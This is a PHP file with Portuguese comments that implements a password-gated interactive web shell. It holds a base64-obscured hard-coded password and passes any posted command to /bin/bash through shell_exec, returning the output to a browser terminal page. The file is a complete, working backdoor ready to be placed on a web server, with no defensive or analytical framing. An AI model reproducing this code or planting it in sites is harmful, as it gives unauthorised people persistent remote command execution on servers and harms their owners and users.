<?php
session_start();

// Defina a senha
$encoded = "bm90aGluZ2lzc2VjdXJl";

define('SENHA', base64_decode($encoded));  // Altere para a senha desejada

// Verifica se o usuário está autenticado
if (!isset($_SESSION['autenticado']) || $_SESSION['autenticado'] !== true) {
    // Se a senha for fornecida
    if (isset($_POST['senha']) && $_POST['senha'] === SENHA) {
        $_SESSION['autenticado'] = true; // Marca como autenticado
    } else {
        echo "
        <style>* {align-itemns: center}</style>
        <form method='POST'>
                <label for='senha'>Digite a senha:</label>
                <input type='password' name='senha' required>
                <input type='submit' value='Entrar'>
              </form>";
        exit;
    }
}

// Define o diretório inicial se ainda não estiver definido
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

// Se um comando foi enviado
if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);

    // Verifica se o comando é 'cd'
    if (preg_match('/^cd\s+(.+)/', $cmd, $matches)) {
        $newDir = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $matches[1]);
        if ($newDir && is_dir($newDir)) {
            $_SESSION['cwd'] = $newDir;
        }
        echo $_SESSION['cwd']; // Retorna o diretório atual
    } else {
        // Usa /bin/bash para executar o comando no contexto do terminal
        $output = shell_exec("cd " . escapeshellarg($_SESSION['cwd']) . " && /bin/bash -c " . escapeshellarg($cmd) . " 2>&1");
        echo htmlspecialchars($output); // Retorna a saída do comando
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <title>Terminal Web Shell</title>
    <style>
        body {
            background-color: black;
            color: lightgreen;
            font-family: monospace;
        }
        #terminal {
            width: 80%;
            height: 400px;
            overflow-y: auto;
            padding: 10px;
            border: 1px solid lightgreen;
        }
        #cmdline {
            width: 80%;
            background: black;
            color: lightgreen;
            border: none;
            outline: none;
            font-family: monospace;
        }
    </style>
    <script>
        function executarComando() {
            var cmdInput = document.getElementById("cmdline");
            var cmd = cmdInput.value.trim();
            if (cmd === "") return;
            
            var terminal = document.getElementById("terminal");
            terminal.innerHTML += "<pre><b>$ " + cmd + "</b></pre>";

            var xhr = new XMLHttpRequest();
            xhr.open("POST", "", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    terminal.innerHTML += "<pre>" + xhr.responseText + "</pre>";
                    terminal.scrollTop = terminal.scrollHeight; // Auto-scroll para o final
                }
            };
            xhr.send("cmd=" + encodeURIComponent(cmd));
            cmdInput.value = "";
        }

        document.addEventListener("DOMContentLoaded", function() {
            document.getElementById("cmdline").addEventListener("keypress", function(event) {
                if (event.key === "Enter") {
                    executarComando();
                }
            });
        });
    </script>
</head>
<body>
    <h2>Web Shell Interativa</h2>
    <div id="terminal"></div>
    <b>$ </b><input type="text" id="cmdline" autofocus>
</body>
</html>
